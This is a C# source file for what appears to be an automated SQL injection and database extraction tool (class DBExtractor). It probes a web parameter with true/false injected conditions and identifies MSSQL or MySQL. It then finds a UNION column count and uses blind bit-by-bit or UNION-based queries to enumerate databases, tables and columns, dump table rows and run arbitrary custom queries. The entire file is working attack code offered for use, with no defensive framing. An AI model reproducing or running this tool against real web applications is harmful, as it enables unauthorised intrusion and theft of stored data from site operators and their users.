using System;
using System.Collections.Generic;
using System.Text;
using System.Web;
using System.Threading;

namespace Sql_Database_Extraction
{
    class DBExtractor
    {
        #region Properties

        private bool encodeCharacter;
        public bool EncodeCharacter
        {
            get { return encodeCharacter; }
            set { encodeCharacter = value; }
        }

        private bool encodeWhiteSpace;
        public bool EncodeWhiteSpace
        {
            get { return encodeWhiteSpace; }
            set { encodeWhiteSpace = value; }
        }

        private int minColumns;
        public int MinColumns
        {
            get { return minColumns; }
            set { if (value >= 1) minColumns = value; }
        }

        private int maxColumns;
        public int MaxColumns
        {
            get { return maxColumns; }
            set { if (value >= 1) maxColumns = value; }
        }

        private ExtractorInfos extractingInfos;
        public ExtractorInfos ExtractingInfos
        {
            get { return extractingInfos; }
        }

        private bool userStop;
        public bool UserStop
        {
            get { return userStop; }
            set { userStop = value; }
        }

        #endregion

        #region Private

        private InjectPatterns injectionPatterns;
        private InternalData internalData;
        private QueryConstructor queryConstructor;
        private RequestConstructor requestConstructor;
        private InjectionInfos injectInfos;
        private List<Request> RequestList;
        private string LastQueryOutput;
        private RequestManager ReqManager;
        private ManualResetEvent RequestsComplete;
        private InjectingClass Injector;


        #endregion

        public DBExtractor()
        {
            //Properties
            encodeCharacter = false;
            encodeWhiteSpace = false;
            minColumns = 1;
            maxColumns = 20;
            extractingInfos = new ExtractorInfos();

            // Private
            injectionPatterns = new InjectPatterns();
            internalData = new InternalData();
            queryConstructor = new QueryConstructor();
            injectInfos = new InjectionInfos();
            RequestList = new List<Request>();
            LastQueryOutput = string.Empty;
            ReqManager = new RequestManager();
            ReqManager.RequestFinished += new EventFinishedDelegate(ReqManager_RequestFinished);
            RequestsComplete = new ManualResetEvent(false);
            Injector = new InjectingClass();
            userStop = false;
        }

        public void UserStopMethod()
        {
            userStop = true;
        }
        public void UserStartMethod()
        {
            userStop = false;
        }

        void ReqManager_RequestFinished(Request Req)
        {
            RequestList.Add(Req);

            ExtractingInfos.Requests.Add(Req.URL);
            if (RequestList.Count == 8)
            {
                string BinaryString = string.Empty;
                for (int i = 0; i < RequestList.Count; i++)
                {
                    if (QuerySuccessfull(RequestList[i].HTML))
                        BinaryString += "1";
                    else
                        BinaryString += "0";
                }

                if (!BinaryString.Contains("1") || userStop)
                {
                    ReqManager.Stop();
                    RequestsComplete.Set();
                    return;
                }

                LastQueryOutput += BinaryToString(BinaryString);
                ExtractingInfos.CurrentQueryOutput = LastQueryOutput;

                RequestList.Clear();
                if (!userStop)
                {
                    BuildRequestsCharacter(Req.Function, Req.DataBaseType, (Req.naturalRequestNr + 1) / 8 + 1);

                    if (ReqManager.Count() == 0)
                    {
                        ReqManager.Stop();
                        RequestsComplete.Set();
                        extractingInfos.Status.Add("Finished");
                        extractingInfos.CurrentTestFinished = true;
                    }
                }
            }
        }

        public void Prepare(InjectionInfos _injectInfos)
        {
            userStop = false;
            RequestList = new List<Request>();
            extractingInfos = new ExtractorInfos();
            LastQueryOutput = string.Empty;
            Injector = new InjectingClass();
            injectInfos = _injectInfos;
            requestConstructor = new RequestConstructor(_injectInfos);
            requestConstructor.EncodeCharacters = encodeCharacter;
            requestConstructor.EncodeWhiteSpace = encodeWhiteSpace;
            internalData.Prepared = true;
            internalData.UseConditions = true;
        }

        public void TestParameterInjectable()
        {
            if (!internalData.Prepared)
                return;
            extractingInfos.Status.Add("Beginning tests if parameter is injectable");
            extractingInfos.CurrentTestComplete = false;

            internalData.ParameterInjectable = false;
            extractingInfos.Status.Add("Sending requests");
            foreach (string anfang in injectionPatterns.Begin)
            {
                if (internalData.ParameterInjectable)
                    break;

                foreach (string ende in injectionPatterns.End)
                {
                    if (internalData.ParameterInjectable)
                        break;

                    foreach (string condition in injectionPatterns.Conditions)
                    {
                        if (userStop)
                            return;
                        string queryFailed = anfang + condition + "1=0" + ende;
                        requestConstructor.InsertQuery(queryFailed);
                        string HTMLFailed = SendWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST());

                        string querySuccess = anfang + condition + "1=1" + ende;
                        requestConstructor.InsertQuery(querySuccess);
                        string HTMLSuccess = SendWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST());


                        if (HTMLSuccess.Contains(injectInfos.Success) && !HTMLFailed.Contains(injectInfos.Success))
                        {
                            internalData.InjectableBegin = anfang;
                            internalData.InjectableEnd = ende;
                            internalData.InjectableCondition = condition;
                            internalData.ParameterInjectable = true;
                            break;
                        }
                    }
                }
            }
            ExtractingInfos.ParameterInjectable = internalData.ParameterInjectable;
            Injector.InjectBegin = internalData.InjectableBegin;
            Injector.InjectEnd = internalData.InjectableEnd;
            Injector.InjectCondition = internalData.InjectableCondition;

            if (internalData.ParameterInjectable)
            {
                extractingInfos.Status.Add("Parameter is injectable");
                GetDatabaseType();

                if (internalData.ParameterInjectable)
                {
                    List<string> Unions = Injector.InjectUnionQueries(queryConstructor.getUnionQueries(minColumns, maxColumns, internalData.DataBaseType));
                    for (int i = 0; i < Unions.Count; i++)
                    {
                        requestConstructor.InsertQuery(Unions[i]);
                        string UnionRequest = SendWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST());
                        if (UnionRequest.Contains("___ll12344321ll___"))
                        {
                            if (internalData.DataBaseType == eDataBase.MSSQL)
                            {
                                int IndexBegin = Unions[i].IndexOf("CAST(");
                                Injector.UnionQueryBegin = Unions[i].Substring(0, IndexBegin + 5) + "(";

                                int IndexEnd = Unions[i].IndexOf(" as varchar)");
                                Injector.UnionQueryEnd = ")" + Unions[i].Substring(IndexEnd);
                            }
                            else if (internalData.DataBaseType == eDataBase.MySQL)
                            {
                                int IndexBegin = Unions[i].IndexOf("CONCAT(0x5f5f5f6c6c,");
                                Injector.UnionQueryBegin = Unions[i].Substring(0, IndexBegin + "CONCAT(0x5f5f5f6c6c,".Length) + "(";

                                int IndexEnd = Unions[i].IndexOf(",0x6c6c5f5f5f)");
                                Injector.UnionQueryEnd = ")" + Unions[i].Substring(IndexEnd);
                            }

                            internalData.UseConditions = false;
                            break;
                        }
                    }
                    GetDatabaseInfos();
                }
            }
            else
            {
                extractingInfos.Status.Add("Parameter is not injectable");
                extractingInfos.Status.Add("Finished");
            }
            extractingInfos.CurrentTestComplete = true;
        }

        private void GetDatabaseType()
        {
            if (!userStop)
            {
                extractingInfos.Status.Add("Getting Database type");
                BuildRequests("LTRIM(1)", eDataBase.MSSQL);
                if (LastQueryOutput == "1")
                {
                    internalData.DataBaseType = eDataBase.MSSQL;
                    extractingInfos.Status.Add("Database type is MSSQL");
                    extractingInfos.DatabaseType = "MSSQL";
                }
            }
            if (!userStop)
            {
                BuildRequests("CONCAT(0x31,0x31)", eDataBase.MySQL);
                if (LastQueryOutput == "11")
                {
                    internalData.DataBaseType = eDataBase.MySQL;
                    extractingInfos.Status.Add("Database type is MySQL");
                    extractingInfos.DatabaseType = "MySQL";

                }
            }
            if (!userStop)
            {
                if (internalData.DataBaseType == eDataBase.unknown)
                {
                    internalData.ParameterInjectable = false;
                    extractingInfos.Status.Add("Could not get Database type");
                    extractingInfos.Status.Add("Finished");
                }
            }
        }

        public void GetDatabaseInfos()
        {
            if (!internalData.ParameterInjectable || userStop)
                return;
            extractingInfos.CurrentTestComplete = false;
            if (!userStop)
            {
                extractingInfos.Status.Add("Getting Version");
                string Version = string.Empty;
                Version = BuildRequests(queryConstructor.DBGetVersion(internalData.DataBaseType), internalData.DataBaseType);
                extractingInfos.Version = Version;
            }
            if (!userStop)
            {
                extractingInfos.Status.Add("Getting database name");
                string CurrentDatabase = string.Empty;
                CurrentDatabase = BuildRequests(queryConstructor.DBGetDatabase(internalData.DataBaseType), internalData.DataBaseType);
                extractingInfos.CurrentDatabaseName = CurrentDatabase;
            }
            if (!userStop)
            {
                extractingInfos.Status.Add("Getting user");
                string CurrentUser = string.Empty;
                CurrentUser = BuildRequests(queryConstructor.DBGetUser(internalData.DataBaseType), internalData.DataBaseType);
                extractingInfos.User = CurrentUser;
            }
            extractingInfos.CurrentTestComplete = true;
            extractingInfos.Status.Add("Pretests done");
        }

        private string BuildRequests(string Function, eDataBase DB)
        {
            if (internalData.UseConditions)
            {
                extractingInfos.Status.Add("Start asynchron requests");
                RequestList.Clear();
                LastQueryOutput = string.Empty;

                ReqManager = new RequestManager();
                ReqManager.CustomCookieCollection = injectInfos.CustomCookieCollection;
                ReqManager.RequestFinished += new EventFinishedDelegate(ReqManager_RequestFinished);
                ReqManager.StartThreads(4);
                BuildRequestsCharacter(Function, DB, 1);

                RequestsComplete = new ManualResetEvent(false);
                WaitHandle[] WH = new WaitHandle[] { RequestsComplete };
                WaitHandle.WaitAny(WH, -1, false);
                extractingInfos.Status.Add("Asynchron requests complete");
                return LastQueryOutput;
            }

            else
            {
                requestConstructor.InsertQuery(Injector.InjectUnionQuery(Function));
                string HTML = SendWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST());
                int indexBegin = HTML.IndexOf("___ll");
                if (indexBegin == -1)
                    return string.Empty;
                HTML = HTML.Remove(0, indexBegin + 5);

                int indexEnd = HTML.IndexOf("ll___");
                if (indexEnd == -1)
                    return string.Empty;
                HTML = HTML.Remove(indexEnd);

                return HTML;
            }
        }


        private void BuildRequestsCharacter(string Function, eDataBase DB, int CharPos)
        {
            {
                List<string> Queries = new List<string>();
                Queries = Injector.InjectConditionQueries(Function, CharPos, 0, 128, DB);

                for (int i = 0; i < Queries.Count; i++)
                {
                    if (userStop)
                        return;
                    string Query = Queries[i];
                    requestConstructor.InsertQuery(Query);
                    SendAsyncWebrequest(requestConstructor.GetURL(), requestConstructor.GetPOST(), Function, DB);
                }
            }
        }

        private string BinaryToString(string BinaryString)
        {
            if (BinaryString.Length == 0)
                return string.Empty;

            string BinaryStringReversed = string.Empty;
            for (int i = (BinaryString.Length - 1); i >= 0; i--)
                BinaryStringReversed += BinaryString[i].ToString();

            string Text = Convert.ToChar(Convert.ToInt32(BinaryStringReversed, 2)).ToString();
            return Text;
        }

        private bool QuerySuccessfull(string HTML)
        {
            if (HTML.Contains(injectInfos.Success))
                return true;

            return false;
        }

        public void GetDatabases()
        {
            if (!internalData.ParameterInjectable || userStop)
                return;

            extractingInfos.Status.Add("Getting databases");
            extractingInfos.CurrentTestComplete = false;
            extractingInfos.DatabaseInfos.Clear();

            string DatabaseCount = string.Empty;
            DatabaseCount = BuildRequests(queryConstructor.GetDatabaseCountQuery(internalData.DataBaseType), internalData.DataBaseType);

            int iDatabaseCount = Convert.ToInt32(DatabaseCount);
            for (int i = 0; i < iDatabaseCount; i++)
            {
                string DatabaseName = BuildRequests(queryConstructor.GetDatabaseNameQuery(internalData.DataBaseType, i), internalData.DataBaseType);
                extractingInfos.DatabaseInfos.Add(new DatabaseInfo { DatabaseName = DatabaseName });
            }
            extractingInfos.Status.Add("Done: Adding database");
            extractingInfos.CurrentTestComplete = true;
        }

        public void GetTables(object DBindex)
        {
            GetTables((int)DBindex);
        }
        private void GetTables(int DBindex)
        {
            if (!internalData.ParameterInjectable || userStop)
                return;
            if (DBindex > extractingInfos.DatabaseInfos.Count || DBindex < 0)
                return;

            extractingInfos.Status.Add("Getting tables");
            extractingInfos.CurrentTestComplete = false;
            extractingInfos.DatabaseInfos[DBindex].Tables.Clear();

            string TabellenAnz = string.Empty;
            TabellenAnz = BuildRequests(queryConstructor.TabellenAnzahl(extractingInfos.DatabaseInfos[DBindex].DatabaseName, internalData.DataBaseType), internalData.DataBaseType);
            
            int iTableCount = -1;

            if (Int32.TryParse(TabellenAnz,out iTableCount))
            {
                for (int i = 0; i < iTableCount; i++)
                {
                    string TabellenName = BuildRequests(queryConstructor.GetTabellenNamenQuery(extractingInfos.DatabaseInfos[DBindex].DatabaseName, i, internalData.DataBaseType), internalData.DataBaseType);
                    extractingInfos.DatabaseInfos[DBindex].Tables.Add(new Table { TableName = TabellenName });
                }
            }
            extractingInfos.Status.Add("Done: Adding tables");
            extractingInfos.CurrentTestComplete = true;
        }

        public void GetColumns(object Parameter)
        {
            string[] Split = Parameter.ToString().Split(',');
            GetColumns(Convert.ToInt32(Split[0]), Convert.ToInt32(Split[1]));
        }
        private void GetColumns(int DBindex, int TableIndex)
        {
            if (!internalData.ParameterInjectable || userStop)
                return;
            if (DBindex > extractingInfos.DatabaseInfos.Count || DBindex < 0)
                return;

            extractingInfos.Status.Add("Getting columns");
            extractingInfos.CurrentTestComplete = false;
            extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Clear();

            string Feldanzahl = string.Empty;
            Feldanzahl = BuildRequests(queryConstructor.GetFeldAnzahlQuery(extractingInfos.DatabaseInfos[DBindex].DatabaseName, extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].TableName, internalData.DataBaseType), internalData.DataBaseType);

            int iFeldanzahl = Convert.ToInt32(Feldanzahl);
            for (int i = 0; i < iFeldanzahl; i++)
            {
                string FeldName = BuildRequests(queryConstructor.GetFeldNamenQuery(extractingInfos.DatabaseInfos[DBindex].DatabaseName, extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].TableName, i, internalData.DataBaseType), internalData.DataBaseType);
                string FeldTyp = BuildRequests(queryConstructor.GetFeldTypQuery(extractingInfos.DatabaseInfos[DBindex].DatabaseName, extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].TableName, FeldName, internalData.DataBaseType), internalData.DataBaseType);

                extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Add(new Field { FeldName = FeldName, FeldTyp = FeldTyp });
            }
            extractingInfos.Status.Add("Done: Adding columns");
            extractingInfos.CurrentTestComplete = true;
        }

        public void GetRows(object Parameter)
        {
            string[] Split = Parameter.ToString().Split(',');
            GetRows(Convert.ToInt32(Split[0]), Convert.ToInt32(Split[1]));
        }
        private void GetRows(int DBindex, int TableIndex)
        {
            if (!internalData.ParameterInjectable || userStop)
                return;
            if (DBindex > extractingInfos.DatabaseInfos.Count || DBindex < 0)
                return;

            extractingInfos.Status.Add("Getting rows");
            extractingInfos.CurrentTestComplete = false;

            string DatabaseName = extractingInfos.DatabaseInfos[DBindex].DatabaseName;
            string TabellenName = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].TableName;

            string Rows = string.Empty;
            Rows = BuildRequests(queryConstructor.GetDatarowsCount(DatabaseName, TabellenName, internalData.DataBaseType), internalData.DataBaseType);

            int iRows = Convert.ToInt32(Rows);
            string OrderBySpalte = string.Empty;
            for (int iRow = 0; iRow < 25 && iRow < iRows; iRow++)
            {
                for (int i = 0; i < extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Count; i++)
                {
                    if (iRow == 0)
                        extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[i].FeldWert.Clear();

                    string FeldName = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[i].FeldName;

                    //string FeldWertLänge = string.Empty;
                    //FeldWertLänge = BuildRequests(queryConstructor.GetDatarowsLength(DatabaseName, TabellenName, FeldName, iRow, internalData.DataBaseType), internalData.DataBaseType);
                    //int iFeldWertLänge = Convert.ToInt32(FeldWertLänge);
                    if (OrderBySpalte.Length == 0)
                    {
                        for (int iSpaltepk = 0; iSpaltepk < extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Count; iSpaltepk++)
                        {
                            string FeldTypNeu = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpaltepk].FeldTyp;
                            string FeldNameNeu = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpaltepk].FeldName;
                            if (FeldTypNeu == "int")
                                if (FeldNameNeu.ToLower() == "id" || FeldNameNeu.ToLower() == "pk" || FeldNameNeu.ToLower() == "nr" || FeldNameNeu.ToLower() == "index")
                                {
                                    OrderBySpalte = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpaltepk].FeldName;
                                    break;
                                }
                        }
                    }

                    if (OrderBySpalte.Length == 0)
                    {
                        for (int iSpalte = 0; iSpalte < extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields.Count; iSpalte++)
                        {
                            string FeldTypNeu = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpalte].FeldTyp;
                            if (FeldTypNeu != "text" && FeldTypNeu != "ntext" && FeldTypNeu != "image")
                            {
                                OrderBySpalte = extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[iSpalte].FeldName;
                                break;
                            }
                        }
                    }


                    string FeldWert = BuildRequests(queryConstructor.GetDatarowValue(DatabaseName, TabellenName, FeldName, iRow, OrderBySpalte, internalData.DataBaseType), internalData.DataBaseType);
                    extractingInfos.DatabaseInfos[DBindex].Tables[TableIndex].Fields[i].FeldWert.Add(FeldWert);
                }
            }

            extractingInfos.Status.Add("Done: Adding rows");
            extractingInfos.CurrentTestComplete = true;
        }

        public string ExecuteCustomQuery(string query)
        {
            if (internalData.ParameterInjectable == true)
            {
                string Output = BuildRequests(query, internalData.DataBaseType);
                if (Output == string.Empty)
                    return "query failed or nothing to display";
                else
                    return Output;
            }
            else return "Parameter is not injectable";
        }


        private string SendWebrequest(string URL, string POST)
        {
            CreateWebrequest request = new CreateWebrequest();
            request.CustomCookieCollection = injectInfos.CustomCookieCollection;
            string HTML = request.StringGetWebPage(URL, POST);
            ExtractingInfos.Requests.Add(URL);

            return HTML;
        }

        private void SendAsyncWebrequest(string URL, string POST, string Function, eDataBase DB)
        {
            if (!userStop)
                ReqManager.AddRequest(new Request() { URL = URL, POST = POST, Function = Function, DataBaseType = DB });
        }
    }
}
